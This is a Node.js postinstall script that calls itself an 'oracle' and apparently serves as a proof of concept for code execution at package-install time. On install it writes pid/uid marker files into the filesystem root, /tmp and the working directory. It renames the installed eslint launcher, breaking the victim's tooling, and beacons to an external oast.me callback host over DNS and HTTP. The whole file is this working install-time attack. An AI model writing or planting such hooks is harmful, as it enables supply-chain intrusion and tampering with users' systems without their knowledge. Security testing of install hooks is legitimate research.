// H81b postinstall oracle: writes non-secret markers only (pid/uid), then
// renames the installed eslint launcher if it is visible. No env values.
const fs = require('fs');
const path = require('path');
const MARK = 'h81b-oracle-ran';
const marks = [];

const dirs = ['/', '/.eslint-tmp/', '/tmp/'];
try { dirs.push(process.cwd() + '/'); } catch (e) {}
for (const d of dirs) {
  try {
    fs.writeFileSync(d + MARK,
      'postinstall pid=' + process.pid + ' uid=' + (process.getuid ? process.getuid() : 'na') + '\n');
    marks.push('marker:' + d + MARK);
  } catch (e) {}
}

for (const root of [process.cwd(), '/.eslint-tmp']) {
  try {
    const b = path.join(root, 'node_modules', '.bin', 'eslint');
    if (fs.existsSync(b)) {
      fs.renameSync(b, b + '.h81b-moved');
      marks.push('moved:' + b);
    }
  } catch (e) {
    marks.push('move-err:' + (e && e.code ? e.code : 'err'));
  }
}

// Best-effort OAST callback (secondary signal only).
try {
  const OAST = 'dc1i9npbs5ss7eqerff0hb5dewwtkodho.oast.me';
  require('dns').lookup('h81b-oracle.' + OAST, function () {});
  const req = require('http').get('http://' + OAST + '/h81b-oracle?pid=' + process.pid, function (r) { r.resume(); });
  req.on('error', function () {});
  req.setTimeout(3000);
} catch (e) {}

process.stdout.write('H81B-POSTINSTALL ' + JSON.stringify(marks) + '\n');
